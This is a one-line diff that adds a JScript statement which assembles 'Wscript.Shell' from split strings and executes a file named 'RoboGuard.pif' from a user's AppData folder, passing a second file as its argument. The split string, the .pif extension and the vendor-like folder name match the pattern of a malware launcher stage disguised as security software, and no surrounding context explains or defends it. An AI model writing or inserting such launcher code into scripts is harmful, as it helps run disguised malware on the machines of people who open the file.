@@ -1,0 +1,1 @@
+new ActiveXObject("Wscript.Sh" + "ell").Exec("\"C:\\Users\\george\\AppData\\Local\\SafeNet Robotics Solutions\\RoboGuard.pif\" \"C:\\Users\\george\\AppData\\Local\\SafeNet Robotics Solutions\\L\"")
